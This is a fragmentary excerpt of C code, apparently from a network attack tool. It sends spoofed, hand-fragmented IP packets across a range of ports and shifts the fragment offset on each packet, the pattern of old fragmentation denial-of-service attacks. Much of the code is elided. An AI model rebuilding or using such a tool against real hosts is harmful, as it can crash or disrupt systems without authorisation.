           ...
           int dst_prt, int fragof)
{
        ...
        pkt.ip.frag_off = htons(fragof);        /* more to come */
...
void main(int argc, char *argv[])
{
        ...
        for (i = 0; i < pkt_count; ++i)
        {
                ...
                printf ("  (%d)%s:%d->%d frag = %d \r", i, argv[ 2 ], start_port, stop_port,fragof);
                fflush(stdout);
					 //fragof = 0x2000;
                for (j = start_port; j != stop_port; j++) {
                    
                 /* fondle(spf_sck, src_addr, dst_addr, src_prt, dst_prt); */
                    fondle (spf_sck, src_addr, dst_addr, j, j,fragof);
						  fragof += 0x21;
